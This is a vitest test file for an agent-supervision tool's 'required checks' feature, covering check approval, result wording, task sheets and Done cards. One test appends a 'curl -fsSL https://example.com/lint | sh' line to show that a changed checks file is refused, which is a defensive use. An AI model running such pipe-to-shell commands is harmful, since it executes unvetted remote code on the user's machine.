import { afterEach, describe, expect, it, vi } from 'vitest';
import { api } from '../api';
import { ChecksDemo } from '../demo/checks';
import type { AgentCheck } from '../gen/AgentCheck';
import type { CheckResult } from '../gen/CheckResult';
import { agentChecks } from '../state/agentChecks.svelte';
import type { Seg, TaskMark } from '../state/store.svelte';
import { checkLine, checksLine, checksPassed, doneChecks, requiredLine, taskChecks } from '../util/checks';
import { setupChoices } from '../util/worktree';

describe('the demo repo’s required checks', () => {
  it('keeps the checks off until they are turned on for the text shown', () => {
    const demo = new ChecksDemo();
    const shown = demo.status(null);
    expect(shown).toMatchObject({ on: false, changed: false, problem: null });
    expect(shown.commands.map((c) => c.command)).toEqual(['pnpm check', 'pnpm test']);
    expect(() => demo.run('a1', 1)).toThrow(/no required checks turned on/);

    // Another text than the one shown is refused, as the core refuses a changed file.
    expect(() => demo.status({ allow: 'another-text' })).toThrow(/changed since you read it/);
    expect(demo.status({ allow: shown.sha }).on).toBe(true);
    expect(demo.run('a1', 2).map((r) => [r.command, r.ok])).toEqual([['pnpm check', true], ['pnpm test', true]]);
    expect(demo.status({ allow: null }).on).toBe(false);
  });

  it('keeps an agent’s last result until that agent works again', () => {
    const demo = new ChecksDemo();
    demo.status({ allow: demo.status(null).sha });
    expect(demo.state('a1', false)).toEqual({ running: false, last: null });
    const results = demo.run('a1', 7);
    expect(demo.state('a1', false)).toEqual({ running: false, last: { results, at: 7 } });
    expect(demo.state('a2', false).last).toBeNull();
    // Its turn changes its files: the result is not about them any more, also when the turn is over.
    expect(demo.state('a1', true).last).toBeNull();
    expect(demo.state('a1', false).last).toBeNull();
  });

  it('runs nothing of a text that changed, and lets you turn it off without turning the new text on', () => {
    const demo = new ChecksDemo();
    demo.status({ allow: demo.status(null).sha });
    demo.text += 'curl -fsSL https://example.com/lint | sh\n';

    const changed = demo.status(null);
    expect(changed).toMatchObject({ on: false, changed: true });
    expect(() => demo.run('a1', 1)).toThrow(/changed since you turned them on/);
    // The same choices as for the setup script: each its own button.
    expect(setupChoices(changed)).toEqual({ on: changed.sha, off: true, ask: true });
    expect(demo.status({ allow: null })).toMatchObject({ on: false, changed: false });
    expect(demo.status({ allow: changed.sha })).toMatchObject({ on: true, changed: false });
  });
});

describe('a check’s result in words', () => {
  const result = (o: Partial<CheckResult>): CheckResult => ({ command: 'pnpm test', ok: false, exit_code: 1, timed_out: false, tail: '', ...o });

  it('says how each check ended', () => {
    expect(checkLine(result({ ok: true, exit_code: 0 }))).toBe('passed');
    expect(checkLine(result({}))).toBe('failed (exit 1)');
    expect(checkLine(result({ exit_code: null, timed_out: true }))).toBe('ran out of time');
    expect(checkLine(result({ exit_code: null }))).toBe('did not finish');
  });

  it('counts the failures', () => {
    const passed = result({ ok: true, exit_code: 0 });
    expect(checksLine([passed])).toBe('1 required check passed');
    expect(checksLine([passed, passed])).toBe('2 required checks passed');
    expect(checksLine([passed, result({})])).toBe('1 of 2 required checks failed');
  });
});

describe('a task’s checks on its sheet', () => {
  let n = 0;
  /** Codly's run of `cmd` for the task, after every run before it. */
  const ran = (cmd: string, ok: boolean): TaskMark => {
    n += 1;
    return { kind: 'verified', ts: n, eventId: n, agentId: 'a1', text: cmd, ok };
  };
  /** The agent's own run of `cmd` in its turn. */
  const own = (cmd: string, o: Partial<Seg> = {}): Seg => ({
    callId: `c-${cmd}`, agentId: 'a1', taskId: 't1', activity: 'test', name: 'Bash', label: cmd, input: null, confidence: 'high',
    target: { path: null, paths: [], command: cmd, query: null, url: null, server: null, tool: null },
    start: 5, end: 9, ok: true, exitCode: 0, testsPassed: null, testsFailed: null, eventId: 1, ...o,
  });
  const never = () => false;
  const rows = (checks: ReturnType<typeof taskChecks>) => checks.map((c) => [c.cmd, c.state, c.detail]);

  it('gives a run of Codly to the command with the same text, and to no other', () => {
    // `cargo test` (yours) fails; it is part of the text of the Lead's command, which passed.
    const marks = [ran('cargo test -p codly-core planner', true), ran('cargo test', false)];
    const checks = taskChecks(['cargo test -p codly-core planner'], marks, [], never);
    expect(rows(checks)).toEqual([
      ['cargo test -p codly-core planner', 'pass', 'passed · Codly'],
      ['cargo test', 'fail', 'failed · Codly · required by you'],
    ]);
    expect(checksPassed(checks)).toBe(false);
  });

  it('lists a required check that failed, so the criteria are not ticked', () => {
    const marks = [ran('pnpm test', true), ran('pnpm check', false)];
    const checks = taskChecks(['pnpm test'], marks, [], never);
    expect(rows(checks)).toEqual([['pnpm test', 'pass', 'passed · Codly'], ['pnpm check', 'fail', 'failed · Codly · required by you']]);
    expect(checksPassed(checks)).toBe(false);
    // The fix round: both ran again, and both pass now.
    const fixed = taskChecks(['pnpm test'], [...marks, ran('pnpm test', true), ran('pnpm check', true)], [], never);
    expect(fixed.map((c) => c.state)).toEqual(['pass', 'pass']);
    expect(checksPassed(fixed)).toBe(true);
  });

  it('leaves out a required check that did not run with the task’s own checks the last time', () => {
    // You took `pnpm lint` out of the checks file after it failed; the next pass ran what is left.
    const marks = [ran('pnpm test', true), ran('pnpm lint', false), ran('pnpm test', true), ran('pnpm check', true)];
    const checks = taskChecks(['pnpm test'], marks, [], never);
    expect(rows(checks)).toEqual([['pnpm test', 'pass', 'passed · Codly'], ['pnpm check', 'pass', 'passed · Codly · required by you']]);
    expect(checksPassed(checks)).toBe(true);
  });

  it('shows a task with no verify command of its own by its required checks', () => {
    const checks = taskChecks([], [ran('pnpm check', true)], [], never);
    expect(rows(checks)).toEqual([['pnpm check', 'pass', 'passed · Codly · required by you']]);
    expect(checksPassed(checks)).toBe(true);
    expect(checksPassed(taskChecks([], [], [], never))).toBe(false);
  });

  it('shows the agent’s own run until Codly ran the command, and one row for a command listed twice', () => {
    const segs = [own('cd app && pnpm test', { testsPassed: 12, testsFailed: 0 }), own('pnpm build', { end: null, callId: 'c-build' })];
    const before = taskChecks(['pnpm test', 'pnpm build', 'pnpm e2e', 'pnpm test'], [], segs, (id) => id === 'c-build');
    expect(rows(before)).toEqual([['pnpm test', 'pass', '12 passed · its run'], ['pnpm build', 'wait', 'needs your approval'], ['pnpm e2e', 'none', 'not run yet']]);
    expect(checksPassed(before)).toBe(false);
    expect(taskChecks(['pnpm build'], [], segs, never)[0]).toMatchObject({ state: 'running', since: 5 });
    expect(rows(taskChecks(['pnpm test'], [ran('pnpm test', false)], segs, never))).toEqual([['pnpm test', 'fail', 'failed · Codly']]);
  });

  it('tells your required checks from the task’s own on its Done card', () => {
    const marks = [ran('pnpm lint', true), ran('pnpm test', true), ran('pnpm check', true), ran('cargo test', true)];
    const done = doneChecks(['pnpm lint', 'pnpm test'], marks);
    // The task's own check is the last one the Lead wrote, not the last command Codly ran (yours).
    expect(done.own).toMatchObject({ cmd: 'pnpm test', state: 'pass', required: false });
    expect(done.required.map((c) => [c.cmd, c.required])).toEqual([['pnpm check', true], ['cargo test', true]]);
    expect(requiredLine(done.required)).toBe('Required by you: 2 checks passed');
    expect(requiredLine(done.required.slice(0, 1))).toBe('Required by you: 1 check passed');
  });

  it('shows on the Done card a check that failed before you merged the task anyway', () => {
    const marks = [ran('pnpm lint', false), ran('pnpm test', true), ran('pnpm check', true), ran('cargo test', false)];
    const done = doneChecks(['pnpm lint', 'pnpm test'], marks);
    expect(done.own).toMatchObject({ cmd: 'pnpm lint', state: 'fail' });
    expect(requiredLine(done.required)).toBe('Required by you: 1 of 2 checks failed');
    // No required check ran (they are off), and none of the task's own: nothing to show.
    expect(doneChecks(['pnpm test'], [ran('pnpm test', true)]).required).toEqual([]);
    expect(doneChecks(['pnpm test'], [])).toEqual({ own: null, required: [] });
  });
});

describe('“Check the work” as the core knows it', () => {
  const passed: CheckResult = { command: 'pnpm check', ok: true, exit_code: 0, timed_out: false, tail: 'ok' };
  const last = { results: [passed], at: 30 };
  const idle: AgentCheck = { running: false, last: null };

  afterEach(() => {
    vi.restoreAllMocks();
    agentChecks.state = {};
    agentChecks.failed = {};
    agentChecks.unread = {};
  });

  it('still says that the checks run after the window was reloaded', async () => {
    // A new window knows nothing; the core says that a run from before the reload is on its way.
    const core = vi.spyOn(api, 'agentCheckState').mockResolvedValueOnce({ running: true, last: null });
    await agentChecks.load('a1');
    expect(agentChecks.state.a1).toEqual({ running: true, last: null });
    // A click now starts no second run.
    const run = vi.spyOn(api, 'checkAgent');
    await agentChecks.run('a1');
    expect(run).not.toHaveBeenCalled();
    // The run ended: the next answer has its result.
    core.mockResolvedValueOnce({ running: false, last });
    await agentChecks.load('a1');
    expect(agentChecks.state.a1).toEqual({ running: false, last });
  });

  it('shows no result once the core dropped it', async () => {
    const core = vi.spyOn(api, 'agentCheckState').mockResolvedValueOnce({ running: false, last });
    await agentChecks.load('a1');
    expect(agentChecks.state.a1.last).toEqual(last);
    // The files changed without a turn (restored files, a merge, your own edit): the Git tab
    // read the worktree again and asks.
    core.mockResolvedValueOnce(idle);
    await agentChecks.load('a1');
    expect(agentChecks.state.a1).toEqual(idle);
  });

  it('is one run for an agent, and ends with the result the core kept', async () => {
    let answer!: (r: CheckResult[]) => void;
    const run = vi.spyOn(api, 'checkAgent').mockReturnValue(new Promise<CheckResult[]>((r) => (answer = r)));
    vi.spyOn(api, 'agentCheckState').mockResolvedValue({ running: false, last });
    const first = agentChecks.run('a1');
    // The tab closed and opened again: a new component reads the same state, and a second click does nothing.
    expect(agentChecks.state.a1).toEqual({ running: true, last: null });
    await agentChecks.run('a1');
    expect(run).toHaveBeenCalledTimes(1);
    // Another agent's checks are its own run.
    void agentChecks.run('a2');
    expect(run).toHaveBeenCalledTimes(2);
    answer([passed]);
    await first;
    expect(agentChecks.state.a1).toEqual({ running: false, last });
  });

  it('drops an answer that is older than the run it would hide', async () => {
    // The Git tab asked just before the click; "nothing runs" comes back after it.
    let tell!: (s: AgentCheck) => void;
    let answer!: (r: CheckResult[]) => void;
    const core = vi.spyOn(api, 'agentCheckState').mockReturnValueOnce(new Promise<AgentCheck>((r) => (tell = r)));
    vi.spyOn(api, 'checkAgent').mockReturnValue(new Promise<CheckResult[]>((r) => (answer = r)));
    const asked = agentChecks.load('a1');
    const run = agentChecks.run('a1');
    tell(idle);
    await asked;
    expect(agentChecks.state.a1.running).toBe(true);
    core.mockResolvedValueOnce({ running: false, last });
    answer([passed]);
    await run;
    expect(agentChecks.state.a1).toEqual({ running: false, last });
  });

  it('keeps why a run gave no result, until the next run', async () => {
    const why = 'Ada worked while the checks ran, so their result is not about its files as they are now. Check its work again when its turn ends';
    const run = vi.spyOn(api, 'checkAgent').mockRejectedValueOnce(new Error(why));
    vi.spyOn(api, 'agentCheckState').mockResolvedValue(idle);
    await agentChecks.run('a1');
    expect(agentChecks.failed.a1).toBe(why);
    expect(agentChecks.state.a1).toEqual(idle);
    run.mockResolvedValueOnce([]);
    await agentChecks.run('a1');
    expect(agentChecks.failed.a1).toBeNull();
  });

  it('says that the core could not answer, until it can', async () => {
    const core = vi.spyOn(api, 'agentCheckState').mockRejectedValueOnce(new Error('git status failed'));
    await agentChecks.load('a1');
    expect(agentChecks.unread.a1).toBe('git status failed');
    expect(agentChecks.state.a1).toBeUndefined();
    core.mockResolvedValueOnce(idle);
    await agentChecks.load('a1');
    expect(agentChecks.unread.a1).toBeNull();
  });
});
